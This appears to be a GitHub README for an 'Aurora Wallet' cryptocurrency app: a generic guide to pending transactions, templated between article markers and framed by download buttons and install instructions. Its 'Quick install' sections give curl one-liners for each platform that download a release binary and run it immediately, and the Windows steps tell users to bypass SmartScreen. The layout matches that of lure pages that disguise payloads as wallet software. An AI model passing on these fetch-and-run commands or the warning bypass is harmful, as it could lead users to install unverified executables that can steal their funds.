![Aurora Wallet pending transaction guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet pending transaction: what to do before you resend

A transfer at zero confirmations is waiting for a miner, not lost, and sending it twice pays twice.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The first rule of a pending transaction is patience, because a second send can double the payment.

A broadcast transaction enters the memory pool of every peer that receives it and waits for a miner to include it in a block. A quiet network, a low fee or a wallet that is not fully synced can all leave it waiting. None of those states means the coins are gone.

<!-- ARTICLE-BODY-BEGIN -->

## Check the broadcast before anything else

Copy the transaction identifier from the wallet history and look it up on a public explorer. Three outcomes matter. A transaction that appears with zero confirmations is waiting normally. A transaction that does not appear at all never reached a peer. A transaction with several confirmations is complete, and the wallet display is simply behind.

That last case is common after a restore, because a freshly restored wallet has to resync before it can show the confirmation count.

## Move it along safely

1. Confirm the wallet is fully synced, since a wallet that is behind cannot see its own transaction confirm.
2. Check the explorer entry for the transaction identifier.
3. Leave the wallet open and connected so it keeps announcing the transaction to peers.
4. Wait for the next blocks rather than resending.
5. Resend only if the explorer never saw the transaction and the wallet history shows it as failed.

A transaction that the network never received can be broadcast again safely. A transaction that the network received must not be duplicated, and that distinction is exactly what the explorer lookup tells you.

## Fees and confirmation time

A fee that is low for the current network keeps a transaction waiting longer, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md">how Auroracoin transaction fees work</a> explains what the wallet includes and why the amount is small. If the wallet cannot see the chain at all, the pending display is a sync artefact, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> is the page to open.

Keep the sender wallet on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> so the transaction history reflects the real state of the chain.

## FAQ

### How long should a transfer take?

A confirmation usually arrives within minutes of broadcast. A quiet period can stretch that, and the explorer is the authority on whether the transaction exists.

### Can I cancel a pending transaction?

Not once it has been broadcast. Wait for it to confirm, or for the network to drop it if it was never relayed.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Transaction fees](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md)
- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
